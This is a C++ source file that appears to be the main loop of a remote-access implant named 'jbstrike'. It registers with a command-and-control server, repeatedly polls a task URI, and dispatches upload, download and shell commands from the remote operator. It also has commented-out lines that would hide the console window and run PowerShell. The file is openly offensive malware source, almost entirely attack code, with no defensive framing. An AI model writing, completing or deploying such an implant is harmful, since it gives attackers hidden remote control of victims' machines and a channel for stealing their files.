// jbstrike_0.1a.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <Windows.h>
#include <WinHttp.h>

#include "Config.h"
#include "Agent.h"
#include "Command.h"

#pragma comment(lib, "winhttp.lib")

std::vector <std::string> split(std::string cmd, char delimiter = '|');

int main()
{
	// Hide console window
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	Agent agent;
	Command cmdHandler;

	agent.Register(C2_IP, C2_PORT);

	cmdHandler.RegisterCommand(UPLOAD_CMD, std::bind(&Agent::upload, std::placeholders::_1));
	cmdHandler.RegisterCommand(DOWNLOAD_CMD, std::bind(&Agent::download, std::placeholders::_1));
	cmdHandler.RegisterCommand(SHELL_CMD, std::bind(&Agent::shell, std::placeholders::_1));
	//cmdHandler.RegisterCommand(POWERSHELL_CMD, std::bind(&Agent::powershell, agent));
	//cmdHandler.RegisterCommand(PSIMPORT_CMD, std::bind(&Agent::psimport, agent));


	while (true) {
		std::string task = agent.Get(TASK_URI);

		if (task != "") {
			std::vector <std::string> Task = split(task);
			std::vector <std::string> args;
			args = std::vector<std::string>(Task.begin() + 1, Task.end()); // @todo check if Task has more than 1
			
			std::string Cmd = Task[0];

			if (cmdHandler.HasCommand(Cmd)) {
				cmdHandler.ExecuteCommand(Cmd, args);
			}		
		}

		Sleep(SLEEP_TIME);
	}
}


std::vector <std::string> split(std::string cmd, char delimiter) {
	std::string line;
	std::vector <std::string> vec;
	std::stringstream ss(cmd);

	while (std::getline(ss, line, delimiter)) {
		vec.push_back(line);
	}
	return vec;
}